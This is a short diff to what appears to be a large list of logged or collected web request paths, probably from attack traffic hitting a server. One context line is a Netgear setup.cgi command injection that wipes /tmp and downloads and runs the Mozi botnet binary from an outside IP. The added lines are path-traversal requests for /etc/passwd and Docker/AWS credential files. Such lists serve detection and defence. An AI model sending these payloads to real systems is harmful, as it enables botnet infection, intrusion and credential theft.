@@ -50283,3 +50283,6 @@ http://ifconfig.me/
 /mysbnnqg.php?Fox=d3wL7
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.142.210.185:43384/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /?gad_source=2&gad_campaignid=20619651796&gclid=CjwKCAjwg7PDBhBxEiwAf1CVuy-ivfTRp7K-M74PU1lxaTZBOS9_gPYUlDjomRsH24785ykp-j27WBoCwucQAvD_BwE
+/pms?module=logging&file_name=../../../../../../../../../../../../../../../../../../etc/passwd&number_of_lines=1000
+/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../../../../../etc/passwd
+/aws/credentials?profile=../../../../Users/Shared/Docker/credentials
